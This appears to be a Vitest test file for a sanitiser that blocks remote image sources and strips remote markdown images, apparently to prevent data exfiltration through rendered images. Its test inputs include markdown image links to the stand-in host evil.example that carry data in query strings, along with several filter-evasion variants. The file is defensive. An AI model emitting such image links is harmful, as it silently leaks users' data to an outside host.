import { describe, expect, it } from "vitest";

import { isSafeImageSrc, stripRemoteMarkdownImages } from "./safe-image";

describe("isSafeImageSrc", () => {
  it.each([
    "data:image/png;base64,AAAA",
    "blob:http://localhost/123",
    "asset://localhost/Users/me/a.png",
    "http://asset.localhost/Users/me/a.png",
    "attachments/a.png",
  ])("allows local %s", (src) => {
    expect(isSafeImageSrc(src)).toBe(true);
  });

  it.each([
    "https://evil.example/x.png?q=secret",
    "http://evil.example/x.png",
    "//evil.example/x.png",
    "HTTPS://EVIL.EXAMPLE/x.png",
    "\\\\evil.example/x.png",
    "/\\evil.example/x.png",
    "/\t/evil.example/x.png",
    " \n//evil.example/x.png",
    "",
    undefined,
  ])("blocks remote or empty %s", (src) => {
    expect(isSafeImageSrc(src)).toBe(false);
  });
});

describe("stripRemoteMarkdownImages", () => {
  it("drops remote images and keeps their alt text", () => {
    expect(
      stripRemoteMarkdownImages(
        'Plan ![chart](https://evil.example/c.png?d=pricing+is+%2410 "t") done',
      ),
    ).toBe("Plan chart done");
  });

  it("keeps local images and normal links", () => {
    const text =
      "![a](asset://localhost/a.png) and [docs](https://example.com/page)";
    expect(stripRemoteMarkdownImages(text)).toBe(text);
  });

  it.each([
    ["single-quoted title", "![a](https://evil.example/?d=x 't')"],
    ["parenthesized title", "![a](https://evil.example/?d=x (t))"],
    ["URL in angle brackets", "![a](<https://evil.example/?d=x y>)"],
    ["title on the next line", '![a](https://evil.example/?d=x\n"t")'],
    ["parentheses in the URL", "![a](https://evil.example/x_(1).png)"],
  ])("drops a remote image with a %s", (_, image) => {
    expect(stripRemoteMarkdownImages(`Plan ${image} done`)).toBe(
      "Plan a done",
    );
  });

  it("drops reference-style remote images and their definitions", () => {
    const result = stripRemoteMarkdownImages(
      "Plan ![a][r] and ![b][] done\n\n[r]: https://evil.example/?d=x\n[B]: <https://evil.example/y> 't'",
    );
    expect(result).not.toContain("evil.example");
    expect(result).toContain("Plan a and b done");
  });

  it("keeps local reference images", () => {
    const text = "![a][r]\n\n[r]: asset://localhost/a.png";
    expect(stripRemoteMarkdownImages(text)).toBe(text);
  });
});
